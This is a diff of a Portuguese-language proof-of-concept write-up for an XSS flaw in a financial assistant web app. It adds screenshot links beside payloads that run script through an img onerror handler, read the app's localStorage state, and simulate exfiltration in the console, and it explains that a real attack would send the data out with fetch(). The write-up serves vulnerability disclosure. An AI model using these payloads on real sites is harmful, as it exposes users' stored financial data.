@@ -60,6 +60,8 @@ O payload evoluiu em etapas progressivas, cada uma demonstrando um nível maior 
 <img src=x onerror=alert('XSS-Costa')>
 ```
 
+![PoC - Confirmação de execução do XSS](xss-poc3.png)
+
 **2. Exfiltração parcial visível (prova que dá pra ler o localStorage):**
 ```html
 <img src=x onerror="alert('Dados que vazariam: ' + localStorage.getItem('assistente-financeiro-state').substring(0,150))">
@@ -78,6 +80,8 @@ O payload evoluiu em etapas progressivas, cada uma demonstrando um nível maior 
 ```html
 <img src=x onerror="console.log('%c[SIMULAÇÃO DE EXFILTRAÇÃO]', 'color:red;font-weight:bold', 'Um atacante enviaria isto para o servidor dele:', localStorage.getItem('assistente-financeiro-state'))">
 ```
+
+![PoC - Console mostrando a simulação de exfiltração completa](xss-poc4.png)
 
 Em um cenário de ataque real, o `alert()` / `console.log()` seria substituído por um `fetch()` enviando o conteúdo do `localStorage` para um servidor controlado pelo atacante — sem qualquer indício visível para a vítima.
 
